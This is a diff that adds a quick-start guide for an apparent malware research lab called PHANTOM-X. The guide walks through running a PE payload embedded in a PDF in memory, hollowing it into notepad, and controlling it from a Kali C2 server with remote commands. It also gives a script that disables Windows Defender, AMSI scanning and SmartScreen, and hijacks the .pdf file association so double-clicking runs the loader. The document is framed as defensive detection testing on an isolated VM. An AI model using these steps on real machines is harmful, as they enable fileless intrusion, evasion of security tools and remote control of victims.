@@ -1,0 +1,246 @@
+================================================================================
+PHANTOM-X :: WINDOWS 11 PRO -- QUICK START
+================================================================================
+
+KYA YE HAI
+    Research lab for the chain:
+        PDF -> embedded PE -> in-memory mapping -> execution -> C2
+    Runs on a personally owned, isolated Windows 11 Pro VM.
+
+    Read this file once, then follow the steps in order.
+
+
+--------------------------------------------------------------------------------
+STEP 0 -- KALI (attacker/operator machine) : start the C2
+--------------------------------------------------------------------------------
+    cd /home/syco/phantom-x/phase5_network
+    python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
+
+    NOTE the IP Kali printed. The VM needs it. Find it with:
+        ip -4 addr show | grep -oP 'inet \K[\d.]+'
+
+    LEAVE THIS TERMINAL OPEN. It is the operator console.
+
+
+--------------------------------------------------------------------------------
+STEP 1 -- VM : get the files across
+--------------------------------------------------------------------------------
+    Option A -- USB / shared folder:
+        Copy the whole phantom-x-vm-lab folder to C:\pxvm\
+
+    Option B -- scp from Kali:
+        scp -r phantom-x-vm-lab user@<VM-IP>:C:/pxvm/
+
+    Result: C:\pxvm\ containing px_loader.exe, px_payload.exe, px_hollow.exe,
+            px_attack_chain.pdf, the .ps1 scripts and the .py files.
+
+
+--------------------------------------------------------------------------------
+STEP 2 -- VM : can the VM reach Kali?
+--------------------------------------------------------------------------------
+    In an elevated PowerShell on the VM:
+        Test-NetConnection -ComputerName <KALI-IP> -Port 9001
+
+    Expect: TcpTestSucceeded : True
+    If False -> the VM's NIC is in NAT mode. Change it to host-only or
+    bridged in the hypervisor, then retest.
+
+    Firewall on Kali (if it blocks the VM):
+        sudo ufw allow from <VM-IP> to any port 9001 proto tcp
+
+
+--------------------------------------------------------------------------------
+STEP 3 -- VM : prepare (execution policy + unblock)
+--------------------------------------------------------------------------------
+    cd C:\pxvm
+    .\setup_vm.ps1 -LabFolder C:\pxvm
+
+    Fixes the "not digitally signed" error, reports the Defender posture,
+    and creates the reports folder.
+    It prints everything it changed.
+
+    If it complains that Tamper Protection is on, note it -- the Defender A/B
+    step will not be possible until that is turned off.
+
+
+--------------------------------------------------------------------------------
+STEP 4 -- VM : capture the BEFORE state
+--------------------------------------------------------------------------------
+    .\collect_defender.ps1 -Label before_run1
+
+    STOP CONDITION: open reports\before_run1_defender_status.json and confirm
+    "RealTimeProtectionEnabled": true
+    If it is false -> fix it before continuing. Everything the report claims
+    about Defender depends on it being on.
+
+
+--------------------------------------------------------------------------------
+STEP 5 -- VM : run the chain
+--------------------------------------------------------------------------------
+    cd C:\pxvm
+    $env:PX_C2_HOST = "<KALI-IP>"
+    $env:PX_C2_PORT = "9001"
+    .\px_loader.exe .\px_attack_chain.pdf .\loader.log
+
+    The terminal will appear to hang. THAT IS CORRECT -- the payload is
+    running in a loop. Leave it.
+
+    Expected in loader.log:
+        [loader] embedded file: inflated bytes (encoded flate)
+        [loader] PE: machine=0x8664 ...
+        [loader] mapped at preferred base ...
+        [loader] resolved 31 import(s)
+        [loader] calling entry point ...
+        [px] connecting to <KALI-IP>:9001
+        [px] connected
+
+    Nothing is written to disk for the payload. It is extracted from the PDF
+    straight into memory and executed there.
+
+
+--------------------------------------------------------------------------------
+STEP 6 -- KALI : drive it
+--------------------------------------------------------------------------------
+    In the OTHER terminal, where c2_server.py is running:
+        c2> list
+        c2> exec 1 whoami
+        c2> exec 1 cmd /c ver
+        c2> exec 1 cmd /c tasklist
+        c2> ping 1
+        c2> kill 1
+
+    Command reference:
+        list                 show sessions
+        exec <id|all> <cmd>  run a command
+        ping <id|all>        measure round-trip latency
+        kill <id|all>        send EXIT (controlled termination)
+        stats                counters and audit log path
+        help                 full list
+        quit                 stop the server
+
+    Everything is recorded in c2_audit.jsonl on Kali.
+
+
+--------------------------------------------------------------------------------
+STEP 7 -- VM : capture the AFTER state
+--------------------------------------------------------------------------------
+    Open a SECOND PowerShell on the VM (the first one is still busy):
+        cd C:\pxvm
+        .\collect_defender.ps1 -Label after_run1
+
+    Then stop the loader: Ctrl+C in the first terminal.
+
+
+--------------------------------------------------------------------------------
+STEP 8 -- VM (optional) : run it INSIDE another process
+--------------------------------------------------------------------------------
+    .\px_hollow.exe "C:\Windows\System32\notepad.exe" .\px_attack_chain.pdf
+
+    Same chain, but the payload runs INSIDE notepad: notepad's original
+    image is unmapped, the payload is mapped in its place, and the payload
+    runs on a thread inside that process. The C2 session's pid will be
+    notepad's pid, not px_hollow.exe's.
+
+    Test it end to end:
+        python test_hollow_integration.py
+
+
+--------------------------------------------------------------------------------
+STEP 9 -- VM (optional) : the Defender A/B arm
+--------------------------------------------------------------------------------
+    Turn the whole Microsoft security stack off:
+        .\lab_disable_microsoft_security.ps1 -Action disable -AddLabExclusions -LabFolder C:\pxvm
+
+    That disables real-time protection, behaviour monitoring, IOAV, SCRIPT
+    SCANNING (which is what engages AMSI), archive scanning, PUA protection,
+    controlled folder access, network protection and SmartScreen.
+
+    A scheduled task re-arms the restore in 2 minutes, so the VM cannot be
+    left undefended by accident.
+
+    Repeat steps 5-7 with a different label:
+        .\run_chain_on_vm.ps1 -KaliHost <KALI-IP> -KaliPort 9001 -Label run1_off
+
+    RESTORE (do not skip):
+        .\lab_disable_microsoft_security.ps1 -Action restore
+
+    The comparison between run1 and run1_off is the actual experiment.
+
+
+--------------------------------------------------------------------------------
+STEP 10 -- VM (optional) : double-click the PDF, nothing else
+--------------------------------------------------------------------------------
+    IMPORTANT: do this LAST. If the handler is installed first, the reader
+    never opens and you will wrongly conclude the reader blocked the file.
+
+    \install_pdf_handler.ps1 -LoaderPath C:\pxvm\px_loader.exe
+
+    Now double-click any .pdf in Explorer. No console, no prompt: the loader
+    runs against it.
+
+    Verify the association:
+        Get-ItemProperty "HKCU:\Software\Classes\.pdf" | Select-Object "(default)"
+
+    If your PDF reader still opens instead, Windows has a UserChoice entry
+    that overrides registry associations. The installer removes it, but if
+    you had chosen a default app in Settings, re-pick it afterwards.
+
+    Remove the handler:
+        .\install_pdf_handler.ps1 -Uninstall
+
+
+--------------------------------------------------------------------------------
+STEP 11 -- collect and send back
+--------------------------------------------------------------------------------
+    From the VM:
+        C:\pxvm\reports\before_run1_summary.json
+        C:\pxvm\reports\after_run1_summary.json
+        C:\pxvm\loader_run1.log
+    From Kali:
+        c2_audit.jsonl
+
+    Plus these four facts:
+        reader product + version          Help > About
+        Defender version                  Get-MpComputerStatus | Select AMProductVersion
+        did Defender alert? (event ID)    from the before/after summaries
+        Sysmon event IDs seen             1 process, 3 network, 11 file, 22 DNS
+
+
+--------------------------------------------------------------------------------
+TROUBLESHOOTING
+--------------------------------------------------------------------------------
+  [px] connect failed (10061)
+      The C2 is not running on Kali, or a firewall is blocking it.
+      Check:  sudo ufw allow from <VM-IP> to any port 9001 proto tcp
+
+  Test-NetConnection says False
+      The VM is in NAT mode. Switch it to host-only / bridged.
+
+  "not digitally signed"
+      Get-ChildItem C:\pxvm -Recurse -File | Unblock-File
+      or run setup_vm.ps1 (it does this).
+
+  c2> list shows "no sessions"
+      The VM side never connected. Read loader.log.
+
+  "ABORTED: Real-Time Protection is OFF"
+      run_chain_on_vm.ps1 refuses to run undefended by default.
+      Turn Defender on, or use -AllowDefenderOff for a deliberate A/B arm.
+
+  The loader exits immediately with no output
+      Run it from the folder containing px_attack_chain.pdf, or give the
+      full path to the PDF.
+
+  Nothing happens when a PDF is double-clicked
+      Check HKCU\Software\Classes\.pdf and the UserChoice key. See STEP 10.
+
+
+--------------------------------------------------------------------------------
+SAFETY
+--------------------------------------------------------------------------------
+  * The C2 must stay on the isolated lab network. Never expose it publicly.
+  * The payload has NO persistence. A reboot ends the session. Deliberate.
+  * The payload only ever affects its own process.
+  * Restore Defender after the A/B arm. The before/after snapshots are the
+    evidence that it was on during the measured runs.
+================================================================================
